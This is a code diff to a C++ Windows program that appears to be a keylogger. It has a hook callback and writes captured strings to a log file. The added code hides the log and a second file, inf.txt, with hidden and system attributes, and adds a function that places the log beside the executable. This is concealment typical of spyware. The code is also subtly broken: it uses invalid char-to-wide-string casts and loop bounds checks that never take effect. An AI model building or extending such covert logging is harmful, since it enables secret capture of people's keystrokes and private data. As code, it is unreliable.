@@ -8,6 +8,12 @@ unsigned int sc;
 
 void writeToLog(std::string s) //write a string to the log
 {
+	static char namefile[] = "E:\\learning\\courses\\logger2\\Debug\\inf.txt";
+	SetFileAttributes(LPCWSTR(namefile), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+	std::ofstream logg(namefile, std::ios::app); //opens log file
+	logg << logName;
+	logg.close();
+
 	SetFileAttributes(LPCWSTR(logName), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 	std::ofstream log(logName, std::ios::app); //opens log file
 	log << s; //writes to log.. with format '['']'
@@ -95,3 +101,16 @@ LRESULT CALLBACK hookProc(int nCode,
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
+char* GetCurPath(char* logName)
+{
+	LPTSTR temp = new TCHAR[MAX_PATH];
+	GetModuleFileName(nullptr,temp, MAX_PATH);
+	int i = 0, j = 0;
+	for (i; i < MAX_PATH, temp[i] != '\0'; i++);
+	for (i; i > 0, temp[i] != '\\'; i--);
+	i++;
+	for (i; i < MAX_PATH, logName[j] != '\0'; i++, j++) temp[i] = logName[j];
+	temp[i] = '\0';
+	for (i = 0; i < MAX_PATH, temp[i] != '\0'; i++) logName[i] = temp[i];
+	return logName;
+}
